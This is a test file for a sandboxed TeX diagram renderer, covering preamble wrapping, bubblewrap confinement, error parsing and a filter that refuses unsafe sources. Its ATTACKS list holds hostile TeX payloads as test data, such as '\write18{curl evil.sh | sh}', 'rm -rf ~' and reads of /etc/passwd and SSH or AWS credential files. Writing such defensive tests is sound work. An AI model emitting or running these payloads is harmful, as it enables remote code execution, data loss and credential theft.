import { describe, expect, test } from 'vitest'
import {
  confined,
  diagramDocument,
  diagramFence,
  drawsPicture,
  dvisvgmArgv,
  isJobDir,
  jobDirTemplate,
  LATEX_ARGV,
  mathDocument,
  texEnvironment,
  texError,
  unsafeTex,
} from '../../src/diagram/index.ts'

describe('fences and environments', () => {
  test('latex, tex and tikz fences are diagrams; others are not', () => {
    expect(diagramFence('latex')).toBe('latex')
    expect(diagramFence(' TeX ')).toBe('latex')
    expect(diagramFence('tikz title="x"')).toBe('tikz')
    expect(diagramFence('python')).toBeUndefined()
    expect(diagramFence('')).toBeUndefined()
    expect(diagramFence('math')).toBeUndefined()
  })

  test('a latex fence is drawn only when it draws something', () => {
    expect(drawsPicture('\\begin{tikzpicture}\\draw (0,0) -- (1,1);\\end{tikzpicture}', 'latex')).toBe(true)
    expect(drawsPicture('\\chemfig{*6(-=-=-=)}', 'latex')).toBe(true)
    expect(drawsPicture('\\documentclass{article}\n\\begin{document}Hi\\end{document}', 'latex')).toBe(true)
    expect(drawsPicture('\\begin{axis}\\addplot {x};\\end{axis}', 'latex')).toBe(true)
    expect(drawsPicture('\\frac{a}{b}', 'latex')).toBe(false)
    expect(drawsPicture('\\section{Intro}\nSome text with \\emph{emphasis}.', 'latex')).toBe(false)
    expect(drawsPicture('\\usepackage{amsmath}', 'latex')).toBe(false)
    expect(drawsPicture('\\draw (0,0) -- (1,0);', 'tikz')).toBe(true)
  })
})

describe('documents', () => {
  test('a fragment gets the picture preamble, its \\usepackage lines moved up', () => {
    const doc = diagramDocument('\\usetikzlibrary{mindmap}\n\\begin{tikzpicture}\n\\draw (0,0) -- (1,1);\n\\end{tikzpicture}', 'latex')
    expect(doc.text).toMatch(/^\\documentclass\[dvisvgm,border=1pt\]\{standalone\}/)
    for (const pkg of ['tikz', 'pgfplots', 'chemfig', 'circuitikz', 'tikz-cd', 'siunitx']) expect(doc.text).toContain(`\\usepackage{${pkg}}`)
    expect(doc.text).toContain('\\pgfplotsset{compat=1.18}')
    const lines = doc.text.split('\n')
    expect(lines.indexOf('\\usetikzlibrary{mindmap}')).toBeLessThan(lines.indexOf('\\begin{document}'))
    // The source's line 3 is the document's line offset + 3.
    expect(lines[doc.offset + 3 - 1]).toBe('\\draw (0,0) -- (1,1);')
    expect(doc.baseline).toBe('bottom')
    expect(doc.fontSize).toBe(10)
  })

  test('tikz content without a tikzpicture is wrapped in one', () => {
    const doc = diagramDocument('\\draw (0,0) -- (1,1);', 'tikz')
    expect(doc.text).toContain('\\begin{tikzpicture}\n\\draw (0,0) -- (1,1);\n\\end{tikzpicture}')
    expect(doc.text.split('\n')[doc.offset]).toBe('\\draw (0,0) -- (1,1);')
    expect(diagramDocument('\\tikz \\draw (0,0) -- (1,0);', 'tikz').text).not.toContain('\\begin{tikzpicture}')
  })

  test('a whole document compiles as written, with the SVG driver and empty page styles', () => {
    const doc = diagramDocument('\\documentclass[12pt]{article}\n\\usepackage{tikz}\n\\begin{document}\n\\tikz\\draw (0,0) circle (1);\n\\end{document}', 'latex')
    expect(doc.text.startsWith('\\def\\pgfsysdriver{pgfsys-dvisvgm.def}')).toBe(true)
    expect(doc.text).toContain('\\begin{document}\\pagestyle{empty}\\thispagestyle{empty}')
    expect(doc.fontSize).toBe(12)
    expect(doc.text.split('\n')[doc.offset]).toBe('\\documentclass[12pt]{article}')
  })

  test('a body with \\begin{document} but no class gets one', () => {
    const doc = diagramDocument('\\usepackage{tikz}\n\\begin{document}\n\\tikz\\draw (0,0)--(1,1);\n\\end{document}', 'latex')
    expect(doc.text).toMatch(/\\documentclass\[dvisvgm,border=1pt\]\{standalone\}\n\\usepackage\{tikz\}/)
  })

  test('math: inline in a preview box on its baseline, display cropped', () => {
    const inline = mathDocument('\\unit{m/s^2}', false)
    expect(inline.text).toContain('\\usepackage[active,tightpage]{preview}')
    expect(inline.text).toContain('\\begin{preview}$\\unit{m/s^2}$\\end{preview}')
    expect(inline.baseline).toBe('origin')
    const display = mathDocument('\\qty{3}{m}', true)
    expect(display.text).toContain('\\[\n\\qty{3}{m}\n\\]')
    expect(display.baseline).toBe('bottom')
    expect(mathDocument('\\begin{align*} a &= \\unit{kg} \\end{align*}', true).text).not.toContain('\\[')
  })
})

describe('commands', () => {
  test('latex never escapes to a shell and stops at the first error', () => {
    expect(LATEX_ARGV).toContain('-no-shell-escape')
    expect(LATEX_ARGV).toContain('-halt-on-error')
    expect(LATEX_ARGV).toContain('-interaction=nonstopmode')
    expect(LATEX_ARGV[0]).toBe('latex')
    expect(LATEX_ARGV.at(-1)).toBe('kittex.tex')
  })

  test('dvisvgm draws glyphs as paths, with Ghostscript and generation off', () => {
    const argv = dvisvgmArgv('/tmp/kittex-tex.abcdefghij')
    for (const flag of ['--no-fonts', '--exact-bbox', '--no-specials=ps,pdf,html', '--no-mktexmf', '--cache=none', '--stdout']) expect(argv).toContain(flag)
  })

  test('the environment restricts files and generation', () => {
    const env = texEnvironment('/tmp/kittex-tex.abcdefghij')
    expect(env).toMatchObject({ shell_escape: 'f', openin_any: 'p', openout_any: 'p', TEXMFOUTPUT: '/tmp/kittex-tex.abcdefghij', MKTEXTFM: '0', MKTEXPK: '0' })
  })

  test('confinement wraps the command in prlimit and bubblewrap', () => {
    const dir = '/tmp/kittex-tex.abcdefghij'
    expect(confined(['latex'], dir, { prlimit: false })).toEqual(['latex'])
    const argv = confined(['latex', 'x.tex'], dir, { prlimit: true, bwrap: { hide: ['/home/u', '/tmp'] } })
    expect(argv.slice(0, 4)).toEqual(['prlimit', '--fsize=67108864', '--cpu=20', 'bwrap'])
    expect(argv.join(' ')).toContain('--tmpfs /home/u --tmpfs /tmp --bind /tmp/kittex-tex.abcdefghij /tmp/kittex-tex.abcdefghij --chdir /tmp/kittex-tex.abcdefghij')
    expect(argv).toContain('--unshare-all')
    expect(argv.slice(-2)).toEqual(['latex', 'x.tex'])
  })

  test('only a directory made from the template is removed', () => {
    expect(jobDirTemplate('/tmp/')).toBe('/tmp/kittex-tex.XXXXXXXXXX')
    expect(jobDirTemplate(undefined)).toBe('/tmp/kittex-tex.XXXXXXXXXX')
    expect(jobDirTemplate('relative')).toBe('/tmp/kittex-tex.XXXXXXXXXX')
    expect(isJobDir('/tmp/kittex-tex.Ab3dEf9hIj')).toBe(true)
    expect(isJobDir('/var/folders/x/T/kittex-tex.Ab3dEf9hIj')).toBe(true)
    expect(isJobDir('/')).toBe(false)
    expect(isJobDir('/home/u')).toBe(false)
    expect(isJobDir('/tmp/kittex-tex.Ab3dEf9hIj\n/home')).toBe(false)
    expect(isJobDir('/tmp/../home/kittex-tex.Ab3dEf9hIj')).toBe(false)
    expect(isJobDir('tmp/kittex-tex.Ab3dEf9hIj')).toBe(false)
  })
})

describe('TeX errors', () => {
  test('an undefined control sequence names it and its line', () => {
    const log = 'No file x.aux.\n! Undefined control sequence.\nl.7 Hello \\foo\n               bar baz\nNo pages of output.'
    expect(texError(log, 4)).toBe('Undefined control sequence \\foo (line 3)')
  })

  test("a package's error keeps its message, without its prefix", () => {
    const log = "! Package pgfkeys Error: I do not know the key '/tikz/foo', to which you passed 'bar', and I am going to ignore it. Perhaps you misspelled it.\n\nSee the pgfkeys package documentation for explanation.\nType  H <return>  for immediate help.\n ...\n\nl.14 \\draw[foo=bar] (0,0) -- (1,1);\n"
    expect(texError(log, 12)).toBe("I do not know the key '/tikz/foo', to which you passed 'bar', and I am going to ignore it. Perhaps you misspelled it (line 2)")
  })

  test('a missing package', () => {
    const log = "! LaTeX Error: File `nonexistentpkg.sty' not found.\n\nType X to quit or <RETURN> to proceed,\n! Emergency stop.\n<read *> \n         \nl.3 \\begin\n          {document}^^M\n"
    expect(texError(log, 0)).toBe("File `nonexistentpkg.sty' not found (line 3)")
  })

  test('no error line', () => {
    expect(texError('No pages of output.\n')).toBe('the picture is empty')
    expect(texError('something else')).toBe('TeX failed')
  })
})

/** Sources the model might be steered into writing: each must be refused before TeX sees it. */
const ATTACKS: [string, string][] = [
  ['shell escape', '\\immediate\\write18{curl evil.sh | sh}'],
  ['write18 alone', '\\write18{rm -rf ~}'],
  ['spaced write18', '\\write 18 {id}'],
  ['openout', '\\newwrite\\f\\openout\\f=notes.txt'],
  ['write to a stream', '\\write\\f{hello}'],
  ['input an absolute path', '\\input{/etc/passwd}'],
  ['input without braces', '\\input /home/u/.ssh/id_rsa '],
  ['input a relative file', '\\input{secrets}'],
  ['include', '\\include{../thesis}'],
  ['openin and read', '\\newread\\r\\openin\\r=/etc/hostname \\read\\r to\\x'],
  ['directlua', '\\directlua{os.execute("id")}'],
  ['luaexec', '\\luaexec{os.execute("id")}'],
  ['luacode environment', '\\begin{luacode}os.execute("id")\\end{luacode}'],
  ['special', '\\special{ps: (x) run}'],
  ['dvisvgm image special', '\\special{dvisvgm:img 10 10 /home/u/secret.png}'],
  ['csname rebuild', '\\csname in\\endcsname put{/etc/passwd}'],
  ['catcode games', '\\catcode`\\|=0 |input{x}'],
  ['hex notation', '\\^^69nput{/etc/passwd}'],
  ['scantokens', '\\scantokens{\\input x}'],
  ['expl3', '\\ExplSyntaxOn \\file_input:n {/etc/passwd} \\ExplSyntaxOff'],
  ['@ internals', '\\makeatletter\\def\\input@path{{/home/u/}}\\makeatother'],
  ['internal without makeatletter', '\\@@input /etc/passwd'],
  ['UseName', '\\UseName{input}{/etc/passwd}'],
  ['etoolbox csuse', '\\csuse{input}'],
  ['lowercase rebuild', '\\lccode`\\X=`\\/ \\lowercase{\\def\\p{Xetc}}'],
  ['usepackage by path', '\\usepackage{/home/u/evil}'],
  ['usepackage parent', '\\usepackage{../evil}'],
  ['shellesc package', '\\usepackage{shellesc}'],
  ['minted', '\\usepackage{minted}'],
  ['includegraphics', '\\includegraphics{/home/u/photo.png}'],
  ['graphicspath', '\\graphicspath{{/home/u/}}'],
  ['pgfplots table by path', '\\begin{axis}\\addplot table {/home/u/data.csv};\\end{axis}'],
  ['pgfplots table by parent', '\\addplot table[x=a] {../data.csv};'],
  ['pgfplots table by macro', '\\def\\f{x}\\addplot table {\\f};'],
  ['gnuplot', '\\addplot gnuplot {sin(x)};'],
  ['pgfplots shell', '\\addplot shell {echo 1 2};'],
  ['tikz externalize', '\\tikzexternalize'],
  ['home path in a macro', '\\def\\p{~/.ssh/id_rsa}'],
  ['absolute path in a macro', '\\def\\p{/home/u/.aws/credentials}'],
  ['font by path', '\\font\\f=/home/u/x'],
  ['filecontents', '\\begin{filecontents}{x.tex}\\end{filecontents}'],
  ['pdfTeX file dump', '\\pdffiledump length 100 {/etc/passwd}'],
  ['md5 of a file', '\\pdfmdfivesum file {/etc/passwd}'],
  ['verbatim input', '\\VerbatimInput{/etc/passwd}'],
  ['listings input', '\\lstinputlisting{/etc/passwd}'],
  ['IfFileExists probe', '\\IfFileExists{/home/u/.ssh/id_rsa}{yes}{no}'],
  ['primitive', '\\primitive\\write18{id}'],
  ['control characters', 'x\u0007y'],
  ['too long', 'x'.repeat(30_000)],
]

/** What diagrams really look like: never refused. */
const LEGIT: string[] = [
  '\\begin{tikzpicture}[>=Stealth]\n\\draw[->, thick, red] (0,0) -- (2,1) node[right] {$x^2$};\n\\node[draw, fill=blue!20, circle] (a) at (0,0) {A};\n\\end{tikzpicture}',
  '\\begin{tikzpicture}\n\\begin{axis}[xlabel=$x$, ylabel=$y$, domain=-2:2, samples=50]\n\\addplot[blue] {x^2};\n\\addplot table {x y\\\\ 0 0\\\\ 1 1\\\\};\n\\end{axis}\n\\end{tikzpicture}',
  '\\chemfig{*6(-=-=(-OH)-=)}',
  '\\begin{circuitikz}\\draw (0,0) to[R=$R_1$] (2,0) to[C] (2,2);\\end{circuitikz}',
  '\\begin{tikzcd} A \\arrow[r, "f"] \\arrow[d] & B \\arrow[d] \\\\ C \\arrow[r] & D \\end{tikzcd}',
  '\\usetikzlibrary{decorations.pathmorphing}\n\\begin{tikzpicture}\\draw[decorate, decoration=snake] (0,0) .. controls (1,1) .. (2,0);\\foreach \\x in {1,...,5} \\fill (\\x,0) circle (2pt);\\end{tikzpicture}',
  '\\tikzset{every node/.style={draw}, /tikz/mynode/.style={fill=red}}',
  '\\pgfplotsset{width=8cm, /pgf/number format/precision=2}',
  '\\documentclass[tikz]{standalone}\n\\usepackage{amsmath}\n\\begin{document}\n\\begin{tikzpicture}\\draw (0,0) rectangle (1,1);\\end{tikzpicture}\n\\end{document}',
  '$\\SI{9.81}{\\metre\\per\\second\\squared}$ and \\qty{3e8}{m/s} and \\unit{kg.m/s^2}',
  '\\newcommand{\\vect}[1]{\\boldsymbol{#1}}\\def\\r{2}\\draw (0,0) circle (\\r);',
]

describe('refused sources', () => {
  test.each(ATTACKS)('%s is refused', (_name, source) => {
    expect(unsafeTex(source)).toBeDefined()
  })

  test.each(LEGIT.map(source => [source.slice(0, 50), source]))('%s is allowed', (_name, source) => {
    expect(unsafeTex(source)).toBeUndefined()
  })
})
